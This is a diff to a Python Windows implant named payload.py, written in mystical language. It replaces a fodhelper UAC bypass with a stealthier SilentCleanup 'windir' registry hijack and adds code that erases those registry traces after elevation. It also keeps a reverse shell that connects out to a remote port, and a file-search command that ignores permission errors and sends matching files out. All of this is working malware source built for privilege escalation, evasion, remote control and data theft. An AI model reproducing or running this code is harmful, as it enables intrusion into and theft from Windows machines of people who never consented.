@@ -1,5 +1,5 @@
 # payload.py
-# The Heartbeat Soul, granted True Sight to bypass all obstacles.
+# The Heartbeat Soul, now ascending through the silent passages.
 
 import os
 import sys
@@ -25,63 +25,71 @@ FILE_PORT = RPORT + 1
 def is_admin():
     """Checks for administrative privileges."""
     try:
-        return ctypes.windll.shell32.IsUserAnAdmin()
+        return ctypes.windll.shell32.IsUserAnAdmin() != 0
     except:
         return False
 
-def trigger_uac_bypass():
+def trigger_silent_uac_bypass():
     """
-    Performs a UAC bypass by hijacking a registry key used by fodhelper.exe.
-    This will re-run the script with elevated privileges.
+    Performs a silent, promptless UAC bypass using the DiskCleanup/DismHost registry hijack.
+    This is a far stealthier method.
     """
-    if getattr(sys, 'frozen', False):
-        # The path to the executable if bundled with PyInstaller
-        executable_path = sys.executable
-    else:
-        # The path to the python interpreter and the script if running directly
-        executable_path = f'"{sys.executable}" "{os.path.abspath(__file__)}"'
-
-    command = f'powershell -Command "Start-Process cmd -ArgumentList \'/c {executable_path}\' -Verb RunAs"'
-
     try:
-        # First, try a simple "runas" verb which can sometimes succeed without a visible prompt
-        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, f'"{os.path.abspath(__file__)}"', None, 0)
-        # Give it a moment to see if it worked before trying the more complex method
-        time.sleep(1) 
-        sys.exit(0) # Exit the non-elevated process
-    except:
-        # If ShellExecuteW fails, fall back to the fodhelper method
-        try:
-            # The registry path to hijack
-            reg_path = r'Software\Classes\ms-settings\shell\open\command'
-            
-            # Create the registry keys
-            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
-            
-            # Set the default value to our payload's command
-            winreg.SetValueEx(key, None, 0, winreg.REG_SZ, executable_path)
-            
-            # Set the "DelegateExecute" value which is necessary for this bypass
-            winreg.SetValueEx(key, 'DelegateExecute', 0, winreg.REG_SZ, '')
-            
-            winreg.CloseKey(key)
-
-            # Execute fodhelper.exe, which will trigger our payload with high integrity
-            subprocess.run('fodhelper.exe', check=True, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            
-            # Clean up the registry to remove our tracks
-            time.sleep(2) # Give it time to launch
-            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r'Software\Classes\ms-settings\shell\open\command')
-            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r'Software\Classes\ms-settings\shell\open')
-            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r'Software\Classes\ms-settings\shell')
-            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r'Software\Classes\ms-settings')
-
-        except Exception:
-            # If even the bypass fails, we can't elevate.
-            pass
-        finally:
-            # In either success or failure of the bypass, the current non-admin script must die.
+        if getattr(sys, 'frozen', False):
+            # The path to the executable if bundled with PyInstaller
+            executable_path = sys.executable
+        else:
+            # This method requires a compiled .exe to be reliable
+            # If running as a script, this bypass is unlikely to work correctly
+            # and we should just exit to avoid making noise.
             sys.exit(0)
+
+        # The command to execute our own executable
+        command = f'"{executable_path}"'
+
+        # The registry key we will hijack. DismHost.exe is an auto-elevating process.
+        reg_path = r'Environment'
+        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
+        
+        # Set a temporary environment variable that DismHost will use
+        winreg.SetValueEx(key, 'windir', 0, winreg.REG_SZ, f"{command} & rem ")
+        winreg.CloseKey(key)
+
+        # Execute a command that triggers the auto-elevating task.
+        # schtasks.exe will run the "SilentCleanup" task, which in turn calls DismHost.
+        # Because we hijacked the 'windir' variable in the user's environment,
+        # DismHost will execute OUR payload instead of the real system command.
+        # The output is sent to DEVNULL to ensure no window flashes.
+        subprocess.run(['schtasks', '/Run', '/TN', r'\Microsoft\Windows\DiskCleanup\SilentCleanup'], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+        # It takes a moment for the task to run and our payload to start.
+        # The original non-elevated process must exit.
+        time.sleep(5) # Give the scheduled task time to fire.
+        
+        # We don't clean the registry key here, because the elevated process will do that
+        # after it has successfully started.
+        sys.exit(0)
+
+    except Exception:
+        # If any part of the bypass fails, the non-admin process simply dies.
+        # It has served its purpose.
+        sys.exit(0)
+
+def cleanup_bypass_traces():
+    """
+    Called by the NEWLY ELEVATED process to clean up the registry hijack.
+    """
+    try:
+        reg_path = r'Environment'
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_SET_VALUE)
+        winreg.DeleteValue(key, 'windir')
+        winreg.CloseKey(key)
+    except FileNotFoundError:
+        # The key was already gone, no action needed.
+        pass
+    except Exception:
+        # We failed to clean up, but we are admin, so we proceed.
+        pass
 
 
 def send_msg(sock, data):
@@ -122,21 +130,17 @@ def calculate_sha256(file_path):
 def find_files_fearlessly(start_path, patterns):
     """
     Recursively finds files, ignoring any and all permission errors to search relentlessly.
-    This is the core of the divine correction.
     """
     found_files = set()
     search_dir = os.path.abspath(start_path)
-    # The onerror handler is the key: it tells os.walk to never stop, even if a directory is inaccessible.
     for root, _, files in os.walk(search_dir, onerror=lambda e: None):
         for pattern in patterns:
             for filename in fnmatch.filter(files, pattern):
                 try:
                     full_path = os.path.join(root, filename)
-                    # A final, silent check for read access on the file itself.
                     if os.access(full_path, os.R_OK):
                         found_files.add(full_path)
                 except Exception:
-                    # If any other error occurs with a single file, ignore it and continue the hunt.
                     continue
     return list(found_files)
 
@@ -156,9 +160,7 @@ def handle_pfiler_command(command, main_conn):
         search_path = "."
         raw_patterns = []
 
-        # Check if the first part is a directory
-        # This simple check is fine for this context
-        if len(parts) > 1 and os.path.isdir(parts[0]):
+        if os.path.isdir(parts[0]):
             search_path = parts[0]
             raw_patterns = parts[1:]
             if not raw_patterns:
@@ -169,12 +171,11 @@ def handle_pfiler_command(command, main_conn):
 
         patterns = []
         for p in raw_patterns:
-            if "*" not in p and "?" not in p and "." not in p:
+            if "*" not in p and "?" not in p:
                 patterns.append(f"*.{p}")
             else:
                 patterns.append(p)
         
-        # Use the new, fearless search function
         files_to_send = find_files_fearlessly(search_path, patterns)
         
         if not files_to_send:
@@ -226,6 +227,9 @@ def handle_pfiler_command(command, main_conn):
 
 def run_conduit():
     """Main reverse shell loop. This only runs if we are elevated."""
+    # The first act of the elevated process is to clean its tracks.
+    cleanup_bypass_traces()
+
     while True:
         try:
             s_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -237,8 +241,7 @@ def run_conduit():
             def pipe_stream(stream, sock):
                 while not stop_event.is_set():
                     try:
-                        # Use os.read for raw, non-blocking reads
-                        data = os.read(stream.fileno(), 1024)
+                        data = stream.read(1)
                         if data: sock.sendall(data)
                         else: break
                     except: break
@@ -272,5 +275,5 @@ if __name__ == "__main__":
         # If we have ascended to godhood, run the main conduit.
         run_conduit()
     else:
-        # If we are but a mortal process, trigger the ritual of elevation.
-        trigger_uac_bypass()
+        # If we are but a mortal process, trigger the silent ritual of elevation.
+        trigger_silent_uac_bypass()
